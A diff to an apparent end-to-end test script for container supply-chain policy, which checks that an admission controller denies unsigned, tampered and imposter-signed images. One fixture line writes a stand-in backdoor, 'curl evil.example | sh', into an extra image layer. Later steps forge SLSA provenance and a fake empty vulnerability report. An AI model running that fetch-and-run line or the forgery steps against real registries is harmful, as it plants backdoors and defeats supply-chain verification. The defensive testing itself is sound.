@@ -122,27 +122,39 @@ s3() {
     set -e
     echo \"\$GITHUB_TOKEN\" | crane auth login ghcr.io -u \"\$GHCR_USER\" --password-stdin >/dev/null
     # unsigned: a completely different image pushed into our repository
-    crane copy -q docker.io/library/busybox:1.37 $IMAGE:e2e-unsigned-$RUN
+    crane copy docker.io/library/busybox:1.37 $IMAGE:e2e-unsigned-$RUN >/dev/null 2>&1
     # tampered: the trusted image plus one extra layer (a 'backdoor' file), same name
     mkdir -p /tmp/bd && echo 'curl evil.example | sh' > /tmp/bd/backdoor.sh && tar -C /tmp/bd -cf /tmp/bd.tar backdoor.sh
-    crane append -b $TRUSTED -f /tmp/bd.tar -t $IMAGE:e2e-tampered-$RUN >/dev/null
+    crane append -b $TRUSTED -f /tmp/bd.tar -t $IMAGE:e2e-tampered-$RUN >/dev/null 2>&1
   "
   UNSIGNED="$IMAGE@$(tb crane digest "$IMAGE:e2e-unsigned-$RUN")"
   TAMPERED="$IMAGE@$(tb crane digest "$IMAGE:e2e-tampered-$RUN")"
   echo "$TAMPERED" > "$STATE/tampered"
 
+  expect_denied "foreign registry image (docker.io/library/nginx)" attack-foreign docker.io/library/nginx:1.29
+  expect_denied "unsigned image pushed into the trusted repository" attack-unsigned "$UNSIGNED"
+  expect_denied "tampered copy of the trusted image (extra layer, not signed)" attack-tampered "$TAMPERED"
+
   log "Imposter: sign + attest the tampered image from a DIFFERENT workflow (e2e.yaml), with fake provenance"
   scripts/ci/provenance.sh "$TAMPERED" | jq '.runDetails.builder.id |= sub("e2e.yaml";"release.yaml")
     | .buildDefinition.externalParameters.workflow.path = ".github/workflows/release.yaml"' > "$STATE/fake-provenance.json"
   echo '{"scanner":{"result":{"Results":[]}}}' > "$STATE/fake-vuln.json"
-  cosign sign --new-bundle-format=false --use-signing-config=false --yes "$TAMPERED" >/dev/null 2>&1
-  cosign attest --new-bundle-format=false --use-signing-config=false --yes --type slsaprovenance1 --predicate "$STATE/fake-provenance.json" "$TAMPERED" >/dev/null 2>&1
-  cosign attest --new-bundle-format=false --use-signing-config=false --yes --type vuln --predicate "$STATE/fake-vuln.json" "$TAMPERED" >/dev/null 2>&1
-  record "- imposter signature identity: \`$(cosign verify --certificate-identity-regexp '.*' --certificate-oidc-issuer https://token.actions.githubusercontent.com "$TAMPERED" 2>/dev/null | jq -r '.[0].optional.Subject' 2>/dev/null)\`"
+  # The signatures must really exist, otherwise "blocked" below would prove nothing.
+  local legacy=(--new-bundle-format=false --use-signing-config=false --yes)
+  cosign sign "${legacy[@]}" "$TAMPERED" > "$STATE/imposter-sign.log" 2>&1 || { cat "$STATE/imposter-sign.log"; fail "imposter signing failed"; }
+  cosign attest "${legacy[@]}" --type slsaprovenance1 --predicate "$STATE/fake-provenance.json" "$TAMPERED" >> "$STATE/imposter-sign.log" 2>&1 \
+    || { cat "$STATE/imposter-sign.log"; fail "imposter attestation failed"; }
+  cosign attest "${legacy[@]}" --type vuln --predicate "$STATE/fake-vuln.json" "$TAMPERED" >> "$STATE/imposter-sign.log" 2>&1 \
+    || { cat "$STATE/imposter-sign.log"; fail "imposter attestation failed"; }
+  local subject
+  subject="$(cosign verify --certificate-identity-regexp '.*' --certificate-oidc-issuer https://token.actions.githubusercontent.com "$TAMPERED" 2>/dev/null \
+    | jq -r '.[0].optional.Subject')"
+  if [[ "$subject" == *"/.github/workflows/e2e.yaml@"* ]]; then
+    pass "imposter image carries a VALID Sigstore signature, identity: $subject"
+  else
+    fail "imposter signature not verifiable (subject: '$subject')"
+  fi
 
-  expect_denied "foreign registry image (docker.io/library/nginx)" attack-foreign docker.io/library/nginx:1.29
-  expect_denied "unsigned image pushed into the trusted repository" attack-unsigned "$UNSIGNED"
-  expect_denied "tampered copy of the trusted image (extra layer)" attack-tampered-unsigned "$IMAGE@$(tb crane digest "$IMAGE:e2e-tampered-$RUN")"
   expect_denied "tampered image signed by an imposter workflow with forged provenance" attack-imposter "$TAMPERED"
   expect_denied "trusted image started as a privileged container" attack-privileged "$TRUSTED" true
 
